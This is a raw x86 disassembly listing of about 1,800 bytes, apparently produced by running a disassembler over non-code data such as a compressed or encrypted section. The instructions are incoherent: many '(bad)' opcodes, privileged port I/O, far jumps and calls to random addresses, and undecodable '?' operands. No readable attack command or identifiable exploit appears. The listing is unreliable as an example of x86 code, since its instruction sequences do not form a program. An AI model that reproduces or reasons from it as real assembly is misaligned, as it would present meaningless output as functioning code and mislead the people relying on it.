  41a72c:	(bad)  
  41a72e:	adc    dh,BYTE PTR [esi-0x4d28e88b]
  41a734:	div    esi
  41a736:	js     0x41a6ef
  41a738:	mov    dl,0xfc
  41a73a:	imul   esi,DWORD PTR [edx],0xffffff93
  41a73d:	sub    al,0xce
  41a73f:	(bad)  
  41a740:	fcomi  st,st(3)
  41a742:	xor    eax,0x9890b72a
  41a747:	mov    bl,0xdc
  41a749:	push   es
  41a74a:	and    al,0x51
  41a74c:	jmp    0xb5c0310e
  41a751:	(bad)
  41a756:	es pop ecx
  41a758:	xchg   esi,eax
  41a759:	arpl   WORD PTR [ebx],dx
  41a75b:	jne    0x41a78c
  41a75d:	dec    edi
  41a75e:	mov    cl,0x78
  41a760:	xor    edi,DWORD PTR [esi-0x6c73f888]
  41a766:	push   0xe
  41a768:	aad    0x20
  41a76a:	in     al,dx
  41a76b:	fild   WORD PTR [eax+0x54]
  41a76e:	cmc    
  41a76f:	and    al,0x28
  41a771:	(bad)  
  41a772:	retf   0xfddf
  41a775:	xchg   ebx,eax
  41a776:	or     cl,bh
  41a778:	xchg   BYTE PTR [edi-0x6fac8c2a],al
  41a77e:	pop    edx
  41a77f:	dec    esp
  41a780:	ins    BYTE PTR es:[edi],dx
  41a781:	or     DWORD PTR [ebp+edx*2-0x6d],edx
  41a785:	or     al,0x89
  41a787:	cmp    DWORD PTR [esi+0x7b7489b8],ebp
  41a78d:	pop    edi
  41a78e:	sub    ebp,DWORD PTR [edi]
  41a790:	enter  0x7a30,0xd4
  41a794:	dec    esp
  41a795:	pop    esp
  41a796:	add    ah,BYTE PTR [ecx+0x12261810]
  41a79c:	call   0x148d:0x8cffb4fd
  41a7a3:	or     BYTE PTR [ecx],0xf9
  41a7a6:	sub    edi,DWORD PTR [ecx+0x7e]
  41a7a9:	jge    0x41a814
  41a7ab:	iret   
  41a7ac:	mov    esi,eax
  41a7ae:	or     bl,BYTE PTR [edx-0x58]
  41a7b1:	fistp  WORD PTR [edx+0x1bde9aaa]
  41a7b7:	cmp    BYTE PTR [eax-0xa16a041],ah
  41a7bd:	mov    cl,0x4a
  41a7bf:	dec    esi
  41a7c0:	outs   dx,DWORD PTR ds:[esi]
  41a7c1:	lds    ebp,FWORD PTR [edi+0x606a85c5]
  41a7c7:	adc    dl,ch
  41a7c9:	fidiv  WORD PTR [eax]
  41a7cb:	jmp    0x9eef1085
  41a7d0:	pop    esi
  41a7d1:	push   esp
  41a7d2:	adc    ebx,ecx
  41a7d4:	dec    esp
  41a7d5:	(bad)  
  41a7d6:	xchg   ebx,eax
  41a7d7:	out    0x77,eax
  41a7d9:	fwait
  41a7da:	xor    al,bh
  41a7dc:	add    BYTE PTR [esi+0x6d523820],dh
  41a7e2:	stos   DWORD PTR es:[edi],eax
  41a7e3:	cmp    BYTE PTR [edx+0x47c5caf2],al
  41a7e9:	ja     0x41a7f2
  41a7eb:	xchg   edx,eax
  41a7ec:	test   eax,0x5b4f8df7
  41a7f1:	test   al,0x8e
  41a7f3:	arpl   cx,si
  41a7f5:	xchg   ebx,eax
  41a7f6:	add    bl,bl
  41a7f8:	mov    DWORD PTR [eax+0x2a],ebx
  41a7fb:	das    
  41a7fc:	push   ebp
  41a7fd:	idiv   DWORD PTR [esi-0x39a59315]
  41a803:	push   cs
  41a804:	sub    BYTE PTR [edx+ebx*1+0x52],dl
  41a808:	ror    BYTE PTR [esi-0x19c5ea9e],1
  41a80e:	cmp    eax,0x9c59b6f4
  41a813:	or     al,0xbf
  41a815:	and    DWORD PTR [eax+0x7913ba49],esp
  41a81b:	icebp  
  41a81c:	push   edi
  41a81d:	data16 sub al,0xd8
  41a820:	adc    eax,0x43e6bbd8
  41a825:	lods   eax,DWORD PTR ds:[esi]
  41a826:	hlt    
  41a827:	adc    al,0x23
  41a829:	outs   dx,BYTE PTR ds:[esi]
  41a82a:	add    ch,bl
  41a82c:	jl     0x41a7eb
  41a82e:	das    
  41a82f:	(bad)  
  41a830:	test   dh,0x5
  41a833:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a834:	fwait
  41a835:	mov    esp,DWORD PTR [ebp-0x148b2021]
  41a83b:	sbb    DWORD PTR [edi],eax
  41a83d:	dec    ebp
  41a83e:	xor    bl,BYTE PTR [edi-0x1c0e1d8]
  41a844:	dec    edx
  41a845:	mov    ds:0x2b2e2994,eax
  41a84a:	(bad)  
  41a84b:	jmp    0xce3e6981
  41a850:	jns    0x41a82f
  41a852:	inc    esp
  41a853:	push   esp
  41a854:	sub    BYTE PTR [edx-0x4b53a819],dh
  41a85a:	mov    DWORD PTR [edx+0x619c9836],ebp
  41a860:	nop
  41a861:	lods   al,BYTE PTR ds:[esi]
  41a862:	daa    
  41a863:	(bad)  
  41a864:	lahf   
  41a865:	mov    bl,cl
  41a867:	aaa    
  41a868:	cmp    BYTE PTR [eax-0x69],cl
  41a86b:	push   cs
  41a86c:	add    esp,DWORD PTR [ebx+0x51]
  41a86f:	aaa    
  41a870:	int3   
  41a871:	iret   
  41a872:	jge    0x41a853
  41a874:	in     eax,0xf0
  41a876:	push   es
  41a877:	out    0xbf,al
  41a879:	xor    BYTE PTR [ecx+0x3c4dcedc],cl
  41a87f:	hlt    
  41a880:	push   ebp
  41a881:	sbb    eax,0x6d26dfec
  41a886:	repz pop ebx
  41a888:	or     al,0xb0
  41a88a:	jle    0x41a8a7
  41a88c:	out    dx,eax
  41a88d:	retf   
  41a88e:	xchg   edi,eax
  41a88f:	cli    
  41a890:	xor    esi,DWORD PTR [eax-0x15]
  41a893:	sbb    edi,DWORD PTR [esi+0x6474a616]
  41a899:	dec    eax
  41a89a:	adc    al,0xd7
  41a89c:	or     al,ch
  41a89e:	push   0xffffffeb
  41a8a0:	mov    edi,0x55893ed1
  41a8a5:	int3   
  41a8a6:	scas   al,BYTE PTR es:[edi]
  41a8a7:	jl     0x41a8bd
  41a8a9:	test   eax,0x27e2ddbb
  41a8ae:	call   0xe7d0:0xf0494b41
  41a8b5:	jno    0x41a8a1
  41a8b7:	sbb    eax,0x3014df90
  41a8bc:	xchg   ecx,eax
  41a8bd:	sub    al,0x2d
  41a8bf:	push   eax
  41a8c0:	mov    ds:0x78410939,eax
  41a8c5:	jns    0x41a85f
  41a8c7:	imul   BYTE PTR [esi-0x4d]
  41a8ca:	out    0x5b,al
  41a8cc:	cmp    al,0x92
  41a8ce:	loop   0x41a880
  41a8d0:	imul   edx,DWORD PTR ss:[esi-0xfc332e3],0x8da1c124
  41a8db:	push   di
  41a8dd:	pop    esp
  41a8de:	test   ch,ah
  41a8e0:	jnp    0x41a87e
  41a8e2:	das    
  41a8e3:	icebp  
  41a8e4:	daa    
  41a8e5:	add    ah,cl
  41a8e7:	xor    al,0xd7
  41a8e9:	cmp    dh,BYTE PTR [edi]
  41a8eb:	adc    BYTE PTR [ecx-0x55],ch
  41a8ee:	add    DWORD PTR [esi],ecx
  41a8f0:	rcr    DWORD PTR [ebx+eax*4-0x74],0x9
  41a8f5:	aas    
  41a8f6:	and    BYTE PTR [eax],ah
  41a8f8:	lods   al,BYTE PTR ds:[esi]
  41a8f9:	push   edi
  41a8fa:	repz inc esi
  41a8fc:	cmp    al,0x4d
  41a8fe:	pop    ebx
  41a8ff:	dec    esi
  41a900:	daa    
  41a901:	(bad)  
  41a902:	popf   
  41a903:	vpaddb ymm1,ymm2,YMMWORD PTR [ecx]
  41a907:	sar    BYTE PTR [eax],1
  41a909:	popa   
  41a90a:	mov    al,0x28
  41a90c:	cmp    al,0x8a
  41a90e:	mov    cl,0xfa
  41a910:	push   0x9f997c57
  41a915:	cmc    
  41a916:	fstp   QWORD PTR [ebx]
  41a918:	or     al,bl
  41a91a:	mov    gs,WORD PTR [ebp-0x1f]
  41a91d:	cmp    DWORD PTR [eax-0x619c955f],ebp
  41a923:	push   eax
  41a924:	adc    eax,0x49f2a363
  41a929:	mov    esp,0xc423ba79
  41a92e:	push   cs
  41a92f:	xor    al,0x5a
  41a931:	lods   al,BYTE PTR ds:[esi]
  41a932:	std    
  41a933:	outs   dx,BYTE PTR ds:[esi]
  41a934:	adc    esi,DWORD PTR [edx-0x829e96a]
  41a93a:	and    eax,0x504efe5c
  41a93f:	sub    DWORD PTR ds:0x69e9a8ba,edi
  41a945:	jno    0x41a8cd
  41a947:	add    ebp,DWORD PTR [esi]
  41a949:	sbb    al,BYTE PTR [esi-0x4e]
  41a94c:	ins    DWORD PTR es:[edi],dx
  41a94d:	xchg   esi,eax
  41a94e:	arpl   dx,sp
  41a950:	ja     0x41a930
  41a952:	push   ss
  41a953:	scas   eax,DWORD PTR es:[edi]
  41a954:	pop    ebx
  41a955:	out    dx,al
  41a956:	sub    bl,ch
  41a958:	clc    
  41a959:	xor    cl,BYTE PTR [ecx+0x35]
  41a95c:	scas   eax,DWORD PTR es:[edi]
  41a95d:	out    dx,eax
  41a95e:	mov    ebx,0xc6a0a794
  41a963:	xchg   esp,eax
  41a964:	pop    edi
  41a965:	xchg   DWORD PTR [edi-0x3b8a188b],ecx
  41a96b:	lods   al,BYTE PTR ds:[esi]
  41a96c:	imul   ecx,DWORD PTR [edi-0x29],0x79
  41a970:	mov    DWORD PTR [ecx+0x6d],ebx
  41a973:	dec    edi
  41a974:	cmp    DWORD PTR [ebp-0x44b7c02b],0x24b34f82
  41a97e:	ins    BYTE PTR es:[edi],dx
  41a97f:	and    BYTE PTR ds:0x3fe06bdf,0x69
  41a986:	adc    eax,0x783445c0
  41a98b:	sub    edi,DWORD PTR [edi+edx*4]
  41a98e:	add    DWORD PTR [edi-0x5c],esp
  41a991:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a992:	jmp    0x41a93d
  41a994:	repnz sub ch,dl
  41a997:	adc    edi,DWORD PTR [eax]
  41a999:	mov    ebx,0x79639527
  41a99e:	cs fld st(0)
  41a9a2:	dec    esp
  41a9a3:	inc    ebp
  41a9a4:	xor    BYTE PTR [ecx-0x60536fcd],ah
  41a9aa:	inc    edi
  41a9ab:	loope  0x41a9fd
  41a9ad:	rol    cl,cl
  41a9af:	push   ss
  41a9b0:	push   eax
  41a9b1:	(bad)  
  41a9b2:	test   BYTE PTR [ebp+0x47b71b00],dl
  41a9b8:	dec    edx
  41a9b9:	push   ecx
  41a9ba:	xchg   esp,eax
  41a9bb:	(bad)  
  41a9bc:	repnz mov ah,0x20
  41a9bf:	imul   esi,edx,0xffffffdd
  41a9c2:	lods   al,BYTE PTR ds:[esi]
  41a9c3:	push   ds
  41a9c4:	sub    bl,dh
  41a9c6:	cli    
  41a9c7:	push   0xffffff90
  41a9c9:	fadd   QWORD PTR [eax+0x49cba8a2]
  41a9cf:	retf   
  41a9d0:	dec    esi
  41a9d1:	lods   al,BYTE PTR ds:[esi]
  41a9d2:	clc    
  41a9d3:	cli    
  41a9d4:	sub    eax,0x57a21dc0
  41a9d9:	arpl   WORD PTR [eax-0x7bcaaac0],bx
  41a9df:	cmp    ch,BYTE PTR [esi+0x48]
  41a9e2:	sub    eax,0x1fb04a89
  41a9e7:	cmp    edx,DWORD PTR [ebx+esi*2+0x6a3c8992]
  41a9ee:	inc    eax
  41a9ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9f0:	push   edi
  41a9f1:	aam    0x97
  41a9f3:	sub    al,0xd3
  41a9f5:	pop    ss
  41a9f6:	push   esp
  41a9f7:	cmp    eax,0xf0043856
  41a9fc:	mov    al,ds:0x7043d2b8
  41aa01:	adc    eax,0x4acff4c8
  41aa06:	inc    ebx
  41aa07:	inc    ebx
  41aa08:	sub    al,0xeb
  41aa0a:	push   cs
  41aa0b:	xor    dh,dl
  41aa0d:	or     al,0xcf
  41aa0f:	cmp    al,0xad
  41aa11:	sbb    bl,ch
  41aa13:	mov    edi,ebp
  41aa15:	and    eax,0x680d25da
  41aa1a:	and    DWORD PTR [edx],edx
  41aa1c:	stos   DWORD PTR es:[edi],eax
  41aa1d:	fwait
  41aa1e:	cmc    
  41aa1f:	ins    DWORD PTR es:[edi],dx
  41aa20:	xor    dh,BYTE PTR [edi+0xb81e899]
  41aa26:	dec    eax
  41aa27:	je     0x41a9d1
  41aa29:	enter  0xbb32,0x31
  41aa2d:	lds    edx,FWORD PTR [edi+eax*1]
  41aa30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa31:	jl     0x41aa19
  41aa33:	int3   
  41aa34:	inc    edi
  41aa35:	stos   BYTE PTR es:[edi],al
  41aa36:	je     0x41aa2a
  41aa38:	push   ebx
  41aa39:	push   edi
  41aa3a:	xor    esp,DWORD PTR [edi+0x64d0846a]
  41aa40:	mov    ?,WORD PTR [ecx]
  41aa42:	pop    esi
  41aa43:	mov    ds:0xd19592bc,al
  41aa48:	ret    
  41aa49:	push   0x6e90822
  41aa4e:	sub    al,0x1e
  41aa51:	jecxz  0x41aa7e
  41aa53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa54:	jnp    0x41aa6d
  41aa56:	add    DWORD PTR [eax],ebp
  41aa58:	loop   0x41a9dc
  41aa5a:	aam    0xf3
  41aa5c:	and    bl,BYTE PTR [eax]
  41aa5e:	gs jecxz 0x41a9ff
  41aa61:	push   edx
  41aa62:	(bad)  [eax-0x10]
  41aa65:	mov    al,dh
  41aa67:	test   ax,0xa682
  41aa6b:	sub    eax,0xf1853e31
  41aa70:	test   al,0x4c
  41aa72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa73:	pop    esi
  41aa74:	push   edi
  41aa75:	gs aam 0x21
  41aa78:	pop    ebp
  41aa79:	and    BYTE PTR [ebx+ebp*8+0x17],0x5a
  41aa7e:	pop    ss
  41aa7f:	enter  0xe851,0xd2
  41aa83:	cmp    al,0xbe
  41aa85:	cmp    cl,al
  41aa87:	out    dx,eax
  41aa88:	inc    ebp
  41aa89:	add    al,BYTE PTR [esp+esi*4-0x392b53e5]
  41aa90:	and    eax,DWORD PTR [ebp+0x4a]
  41aa93:	mov    esi,0x94d7084d
  41aa98:	adc    BYTE PTR [ebp+ecx*2-0x1f],dh
  41aa9c:	mov    dh,0xc7
  41aa9e:	add    BYTE PTR [ebp+edx*2+0x775a7fe9],cl
  41aaa5:	call   0xbea9a542
  41aaaa:	pop    ds
  41aaab:	int3   
  41aaac:	sti    
  41aaad:	inc    ecx
  41aaae:	les    edi,FWORD PTR ds:0x81a368d4
  41aab4:	scas   al,BYTE PTR es:[edi]
  41aab5:	rcr    DWORD PTR [ebx+eax*2],cl
  41aab8:	jo     0x41aa6a
  41aaba:	(bad)  
  41aabb:	jecxz  0x41aac1
  41aabd:	adc    bl,BYTE PTR [esi]
  41aabf:	call   FWORD PTR [ebp-0x7d09fab7]
  41aac5:	add    al,0x63
  41aac7:	fwait
  41aac8:	cmp    dl,BYTE PTR [eax+ebp*8]
  41aacb:	and    al,0x5f
  41aacd:	js     0x41aa74
  41aacf:	sbb    esp,DWORD PTR [ecx-0x68]
  41aad2:	mov    al,ds:0x8f1ab675
  41aad7:	cmp    bh,bl
  41aad9:	pop    esp
  41aada:	inc    ebx
  41aadb:	retf   
  41aadc:	aam    0x74
  41aade:	jb     0x41ab4d
  41aae0:	test   al,0x18
  41aae2:	jnp    0x41ab11
  41aae4:	or     edi,DWORD PTR [eax-0x32]
  41aae7:	ss ins DWORD PTR es:[edi],dx
  41aae9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aaea:	mov    ds:0x84faf5e,eax
  41aaef:	xor    eax,ebx
  41aaf1:	xadd   BYTE PTR [ebp-0x54fcc249],ah
  41aaf8:	dec    eax
  41aaf9:	out    0xec,eax
  41aafb:	and    DWORD PTR [ebp-0xd40e5de],ebx
  41ab01:	sub    al,0x46
  41ab03:	mov    BYTE PTR [ebx-0x54],bh
  41ab06:	ror    BYTE PTR [edi],0x15
  41ab09:	(bad)  
  41ab0a:	stc    
  41ab0b:	and    eax,0x37620e84
  41ab10:	cmp    eax,0x86db5a2c
  41ab15:	push   0x5058c6d4
  41ab1a:	push   ss
  41ab1b:	push   esp
  41ab1c:	shl    BYTE PTR [esi],0xd3
  41ab1f:	rcl    ebx,0x59
  41ab22:	push   0xb98c6181
  41ab27:	add    cl,BYTE PTR [esi-0x74647765]
  41ab2d:	mov    cl,0x9f
  41ab2f:	retf   
  41ab30:	mov    dh,dh
  41ab32:	enter  0x2d96,0x82
  41ab36:	pusha  
  41ab37:	mov    bh,0xf5
  41ab39:	cdq    
  41ab3a:	popf   
  41ab3b:	lea    eax,[edx+esi*2]
  41ab3e:	or     bh,BYTE PTR [esi-0x4d25d6e4]
  41ab44:	cmp    al,0x23
  41ab46:	repz xchg ebp,eax
  41ab48:	adc    al,0x2d
  41ab4a:	add    bh,BYTE PTR [ebp+0x2283cd9c]
  41ab50:	dec    edx
  41ab51:	xor    BYTE PTR [esi+0x58c1507b],dh
  41ab57:	ins    BYTE PTR es:[edi],dx
  41ab58:	call   0x2bff15e
  41ab5d:	leave  
  41ab5e:	jb     0x41ab6c
  41ab60:	retf   
  41ab61:	aas    
  41ab62:	fldenv [eax-0x9]
  41ab65:	jge    0x41ab2a
  41ab67:	add    al,0xef
  41ab69:	xor    eax,0xd04aab87
  41ab6e:	mov    al,0x6d
  41ab70:	je     0x41ab25
  41ab72:	les    edx,FWORD PTR [ecx+0x4969607]
  41ab78:	push   esp
  41ab79:	push   0x2e
  41ab7b:	popa   
  41ab7c:	(bad)  
  41ab7d:	sub    dl,BYTE PTR [eax+0x53]
  41ab80:	leave  
  41ab81:	loopne 0x41abd5
  41ab83:	xchg   ecx,eax
  41ab84:	pop    edi
  41ab85:	psllw  mm2,QWORD PTR [edi-0x67552bdc]
  41ab8c:	mov    edi,0xd8f9ac2d
  41ab91:	jne    0x41ac05
  41ab93:	out    dx,eax
  41ab94:	add    eax,0x54699d11
  41ab99:	jns    0x41aba1
  41ab9b:	fiadd  DWORD PTR [ebx+0x1e]
  41ab9e:	add    eax,0x83060fae
  41aba3:	lds    esp,FWORD PTR [ebp+0x581168f1]
  41aba9:	dec    eax
  41abaa:	shl    ebx,1
  41abac:	jmp    0x8049:0x68a33986
  41abb3:	out    0x90,al
  41abb5:	mov    ds,WORD PTR [ecx+esi*8+0x23]
  41abb9:	inc    ebx
  41abba:	(bad)  
  41abbb:	push   0xfffffff6
  41abbd:	scas   eax,DWORD PTR es:[edi]
  41abbe:	es xchg edi,eax
  41abc0:	pushf  
  41abc1:	push   cs
  41abc2:	clc    
  41abc3:	mov    cl,0x68
  41abc5:	adc    ebx,edx
  41abc7:	or     DWORD PTR [edx+0x65525a04],esp
  41abcd:	push   esi
  41abce:	jnp    0x41abcf
  41abd0:	mov    edi,0xdd2069cb
  41abd5:	mov    ebx,0xabb0fa94
  41abda:	ds es push 0x2a
  41abde:	fldcw  WORD PTR [ecx+ebx*2+0xf44ae13]
  41abe5:	pop    eax
  41abe6:	(bad)  
  41abe7:	std    
  41abe8:	cmp    esp,DWORD PTR [esi]
  41abea:	loop   0x41ac4c
  41abec:	sub    bh,bl
  41abee:	ds aad 0xd1
  41abf1:	pop    eax
  41abf2:	mov    edx,0xc409c0ff
  41abf7:	test   esp,eax
  41abf9:	pop    ebp
  41abfa:	repnz fld QWORD PTR [ebp-0x3434f3c2]
  41ac01:	into   
  41ac02:	gs icebp 
  41ac04:	inc    ecx
  41ac05:	cdq    
  41ac06:	sbb    BYTE PTR [edx-0x626ae3c4],al
  41ac0c:	gs mov eax,0x570c865
  41ac12:	mov    BYTE PTR [eax+0x6df29b92],0xf
  41ac19:	nop
  41ac1a:	jno    0x41ac6f
  41ac1c:	sub    edi,DWORD PTR [ebx+ecx*4-0x1766758e]
  41ac23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac24:	pusha  
  41ac25:	out    0x43,eax
  41ac27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac28:	mov    esp,0xad9084f2
  41ac2d:	dec    edx
  41ac2e:	mov    WORD PTR [edi+0x23],?
  41ac31:	pop    ss
  41ac32:	ret    0xae10
  41ac35:	inc    ecx
  41ac36:	push   ss
  41ac37:	jecxz  0x41abdc
  41ac39:	(bad)  
  41ac3a:	push   eax
  41ac3b:	popa   
  41ac3c:	mov    BYTE PTR [edi-0x54ed9f6d],ch
  41ac42:	mov    dl,0xd1
  41ac44:	fsub   DWORD PTR [ebx]
  41ac46:	xor    ebp,DWORD PTR [ebx+0xad65e36]
  41ac4c:	mov    edx,0x476c6744
  41ac51:	into   
  41ac52:	mov    bh,0xd6
  41ac54:	sub    DWORD PTR [ebx-0x5a],ecx
  41ac57:	stos   DWORD PTR es:[edi],eax
  41ac58:	icebp  
  41ac59:	cld    
  41ac5a:	mov    BYTE PTR es:[ecx+0x54fea83e],ah
  41ac61:	daa    
  41ac62:	mov    ds:0x8a7bc786,al
  41ac67:	pop    ds
  41ac68:	jecxz  0x41ac62
  41ac6a:	jb     0x41ac5f
  41ac6c:	mov    edx,gs
  41ac6e:	pop    edx
  41ac6f:	add    ch,ah
  41ac71:	loopne 0x41acde
  41ac73:	stc    
  41ac74:	or     edx,esp
  41ac76:	scas   al,BYTE PTR es:[edi]
  41ac77:	das    
  41ac78:	test   al,0x4d
  41ac7a:	push   ebx
  41ac7b:	loope  0x41ac90
  41ac7d:	sar    BYTE PTR [edx+0x19910d47],0x5c
  41ac84:	in     eax,0xe
  41ac86:	inc    edx
  41ac87:	dec    eax
  41ac88:	into   
  41ac89:	xlat   BYTE PTR ds:[ebx]
  41ac8a:	ds jmp 0xfb8a:0x9cc95bfe
  41ac92:	xchg   BYTE PTR [esi+ebx*2],ah
  41ac95:	cmp    BYTE PTR [edx+0xb6e10d8],cl
  41ac9b:	jg     0x41ac4a
  41ac9d:	jp     0x41acb9
  41ac9f:	jae    0x41ac97
  41aca1:	ins    DWORD PTR es:[edi],dx
  41aca2:	(bad)  
  41aca3:	adc    al,0x3f
  41aca5:	loope  0x41acd9
  41aca7:	int    0x98
  41aca9:	or     eax,0x5a649097
  41acae:	add    bl,BYTE PTR [ecx+0x6fd9ec9f]
  41acb4:	xchg   esp,eax
  41acb5:	jmp    0xbd07:0xda6152d7
  41acbc:	xor    al,0xf7
  41acbe:	adc    BYTE PTR [ebx],bl
  41acc0:	jb     0x41ad2c
  41acc2:	mov    ebx,0xce194f6c
  41acc7:	sbb    eax,0x9d10ae1f
  41accc:	pop    eax
  41accd:	popa   
  41acce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41accf:	imul   esi,DWORD PTR [edi+0x17],0xfffffff4
  41acd3:	cmp    bl,BYTE PTR [eax-0x11]
  41acd6:	ror    DWORD PTR [esi-0x4fcbf1fe],1
  41acdc:	lea    ebx,[eax]
  41acde:	ds xor edi,0xa4e88f86
  41ace5:	pop    ecx
  41ace6:	scas   al,BYTE PTR es:[edi]
  41ace7:	mov    dl,0x11
  41ace9:	int    0x84
  41aceb:	push   ecx
  41acec:	out    dx,eax
  41aced:	mov    esi,0xe8d7ca71
  41acf2:	xor    DWORD PTR [ebp-0x46],ebp
  41acf5:	nop
  41acf6:	lea    edx,[ecx+0x57]
  41acf9:	push   ecx
  41acfa:	popa   
  41acfb:	or     BYTE PTR [edi+ebp*8-0x2796f626],0x5f
  41ad03:	sti    
  41ad04:	test   DWORD PTR [ebp+0x3b1b5575],esp
  41ad0a:	hlt    
  41ad0b:	and    eax,0x3f400215
  41ad10:	stos   DWORD PTR es:[edi],eax
  41ad11:	jo     0x41acb6
  41ad13:	cmova  eax,DWORD PTR [ecx]
  41ad16:	lock push esp
  41ad18:	add    edi,DWORD PTR [eax+0x6f]
  41ad1b:	jae    0x41acf1
  41ad1d:	ss jno 0x41ad14
  41ad20:	addr16 xchg edx,eax
  41ad22:	es jle 0x41accb
  41ad25:	push   esi
  41ad26:	or     esi,DWORD PTR [esi]
  41ad28:	sbb    esp,0xffffffe8
  41ad2b:	(bad)  
  41ad2c:	int3   
  41ad2d:	shl    BYTE PTR [eax-0x4f],cl
  41ad30:	mov    fs,WORD PTR [ebx-0x69cfcc93]
  41ad36:	push   es
  41ad37:	je     0x41ad1c
  41ad39:	fwait
  41ad3a:	cmp    edi,esp
  41ad3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad3d:	sbb    ecx,0xb99baaa0
  41ad43:	jp     0x41ad7c
  41ad45:	fadd   DWORD PTR [ebp+ebx*4-0x7b]
  41ad49:	pop    DWORD PTR [edx]
  41ad4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad4c:	(bad)
  41ad4f:	xabort 0x62
  41ad52:	mov    ah,0x62
  41ad54:	fsubr  DWORD PTR [ebx]
  41ad56:	inc    eax
  41ad57:	inc    edi
  41ad58:	jo     0x41acf1
  41ad5a:	test   al,al
  41ad5c:	and    al,0x2f
  41ad5e:	jo     0x41ad19
  41ad60:	xchg   ebp,eax
  41ad61:	add    eax,0x244361dd
  41ad66:	jbe    0x41adde
  41ad68:	jb     0x41add4
  41ad6a:	std    
  41ad6b:	mov    ebx,DWORD PTR [eax]
  41ad6d:	ret    0x385c
  41ad70:	call   0xe9dd9bd
  41ad75:	sub    edi,DWORD PTR [esi-0x19]
  41ad78:	imul   ebx,ecx,0x85fa7096
  41ad7e:	cli    
  41ad7f:	iret   
  41ad80:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41ad82:	add    ah,BYTE PTR [ecx]
  41ad84:	mov    edi,eax
  41ad86:	dec    edi
  41ad87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad88:	pusha  
  41ad89:	and    dh,al
  41ad8b:	push   edi
  41ad8c:	xchg   esi,eax
  41ad8d:	mov    esp,esi
  41ad8f:	mov    ah,0x5a
  41ad91:	(bad)  
  41ad92:	fs dec edx
  41ad94:	seta   dl
  41ad97:	(bad)  
  41ad98:	loope  0x41ad50
  41ad9a:	push   ebp
  41ad9b:	int3   
  41ad9c:	seto   BYTE PTR [eax-0x561e216a]
  41ada3:	dec    eax
  41ada4:	inc    ebp
  41ada5:	dec    esp
  41ada6:	retf   0x48a
  41ada9:	out    0x3c,al
  41adab:	push   0x7d6ac30d
  41adb0:	or     al,0xc7
  41adb2:	out    dx,eax
  41adb3:	xor    esi,DWORD PTR [esp+esi*8]
  41adb6:	mov    esi,0x578f668
  41adbb:	fsubr  st,st(6)
  41adbd:	test   ecx,ebx
  41adbf:	jmp    DWORD PTR [ecx-0x654fbe87]
  41adc5:	and    dh,BYTE PTR [eax-0x56]
  41adc8:	mov    esp,0x5b0ef522
  41adcd:	fsubp  st(6),st
  41adcf:	lods   eax,DWORD PTR ds:[esi]
  41add0:	out    dx,eax
  41add1:	dec    edi
  41add2:	xor    eax,0x4c49929
  41add7:	add    eax,0xc1084b45
  41addc:	push   edi
  41addd:	jnp    0x41ad71
  41addf:	aam    0x7c
  41ade1:	pop    esi
  41ade2:	fs dec edi
  41ade4:	std    
  41ade5:	push   esi
  41ade6:	scas   al,BYTE PTR es:[edi]
  41ade7:	push   cs
  41ade8:	dec    esi
  41ade9:	pushf  
  41adea:	push   esi
  41adeb:	cmp    ch,BYTE PTR [edi]
  41aded:	sub    esi,edx
  41adef:	cs push 0x5608a8fa
  41adf5:	xchg   edx,eax
  41adf6:	pop    esp
  41adf7:	sbb    al,bh
  41adf9:	loopne 0x41adf6
  41adfb:	popw   ds
  41adfd:	push   0x49
  41adff:	jp     0x41ae17
  41ae01:	(bad)  
  41ae02:	addr16 es (bad) 
  41ae05:	jmp    0xd4a1:0xb5224497
  41ae0c:	sbb    al,0x2e
  41ae0e:	imul   eax,DWORD PTR [edx-0x6342738c],0xffffffe8
  41ae15:	fwait
  41ae16:	ja     0x41ae68
  41ae18:	cmc    
  41ae19:	mov    eax,0x824bd631
  41ae1e:	push   eax
  41ae1f:	das    
  41ae20:	adc    al,0xc8
  41ae22:	jecxz  0x41ae26
  41ae24:	fs enter 0xc169,0xa1
  41ae29:	jg     0x41ae22
  41ae2b:	dec    cl
  41ae2d:	inc    eax
  41ae2e:	mov    ebp,0xcc633763
  41ae33:	inc    edx
  41ae34:	xlat   BYTE PTR ds:[ebx]
  41ae35:	lods   eax,DWORD PTR ds:[esi]
  41ae36:	push   edi
  41ae37:	stc    
  41ae38:	add    dl,dh
  41ae3a:	neg    DWORD PTR [edx-0x35850101]
  41ae40:	outs   dx,DWORD PTR ds:[esi]
  41ae41:	add    DWORD PTR [edi],eax
  41ae43:	jb     0x41ae5e
  41ae45:	or     dh,BYTE PTR [ebp-0x9]
  41ae48:	lahf   
  41ae49:	ins    DWORD PTR es:[edi],dx
  41ae4a:	mov    dh,0x3d
  41ae4c:	les    esi,FWORD PTR [ebx]
  41ae4e:	aad    0x7a
  41ae50:	ss or  dl,cl
  41ae53:	bound  eax,QWORD PTR [esp+ebp*8+0xd]
  41ae57:	cmc    
  41ae58:	bound  ecx,QWORD PTR [ebx-0x14]
  41ae5b:	sbb    al,0xdd
  41ae5d:	mov    bl,bh
  41ae5f:	pop    esi
  41ae60:	push   ds
  41ae61:	or     al,0x20
  41ae63:	push   0x4d08d2fd
  41ae68:	iret   
  41ae69:	or     bh,BYTE PTR [ebx]
  41ae6b:	push   edx
  41ae6c:	mov    ch,0x96
  41ae6e:	mov    ecx,0x8f8cbd68
  41ae73:	mov    bl,0x5
  41ae75:	adc    ah,BYTE PTR [ebp+0x40]
  41ae78:	ins    BYTE PTR es:[edi],dx
  41ae79:	in     al,dx
  41ae7a:	scas   al,BYTE PTR es:[edi]
  41ae7b:	lods   al,BYTE PTR ds:[esi]
  41ae7c:	mov    edx,0xd7a19ea
  41ae81:	imul   ebp,DWORD PTR [esi-0x3a],0xf34e2c0f
  41ae88:	pop    ebp
